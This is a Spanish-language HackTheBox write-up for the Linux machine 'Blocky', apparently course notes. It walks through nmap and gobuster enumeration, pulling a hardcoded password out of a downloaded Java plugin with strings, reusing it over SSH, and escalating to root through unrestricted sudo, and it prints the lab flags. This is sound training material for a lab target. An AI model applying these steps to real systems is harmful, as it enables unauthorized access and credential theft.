# Blocky

> 🧠 **Plataforma:** HackTheBox
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 25 de enero de 2025 16:39
>
> 🌐 **IP:** `10.10.10.37`

---


## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.37 -oG targeted

PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p21,22,80,25565 -sCV 10.10.10.37 -oN targeted

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

- **Identificación de vulnerabilidades**
    - 21/tcp    open  ftp       ProFTPD 1.3.5a
    - 22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
    - 80/tcp    open  http      Apache httpd 2.4.18
    - 25565/tcp open  minecraft Minecraft 1.11.2
    
- **Enumeración WEB**
    
    Hacemos fuzzing para ver sitios
    
    ```bash
    ❯ gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    
    Starting gobuster in directory enumeration mode
    ===============================================================
    /wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
    /wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
    /plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
    /wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
    /javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
    /wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
    /phpmyadmin 
    
    ```
    

Vemos que en el directorio /plugins hay dos ficheros. Los descargamos :

```bash
❯ wget http://blocky.htb/plugins/files/BlockyCore.jar
❯ wget http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
```

Abrimos los ficheros. Dentro de BlockyCore hay dos ficheros mas. Abrimos BlockyCore.class y vemos con strings si hay datos

```bash
 strings BlockyCore.class
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
	localhost	
root	
8YsqfCTnvxAUeduzjNSXe22	
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```

Encontramos un password para root: 8YsqfCTnvxAUeduzjNSXe22	

Probamos a acceder por ssh

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Probamos a acceder con credenciales anteriores de root. Vemos que no funciona

Probamos a accder con credenciales para usuario anterior visto en la web: notch

```bash
❯ ssh notch@10.10.10.37
notch@Blocky:~$ 
```

Encontramos flag de user.txt

```bash
notch@Blocky:~$ ls  
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
d649a752520fd4d3d4477eb021cef751
notch@Blocky:~$ 

```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

Vamos a probar a escalar privilegios desde notch hasta root.

```bash
notch@Blocky:~$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# 

```

Hemos visto que como usuario notch podemos ejecutar cualquier comando, por lo que nos convertimos en root y obtenemos la flag

```bash
root@Blocky:~# cat root.txt 
3c7c13456cbfef5026ce92b9f4cf6524
```

## Conclusión

<aside>
💡 Maquina fácil con una escalada prácticamente nula

</aside>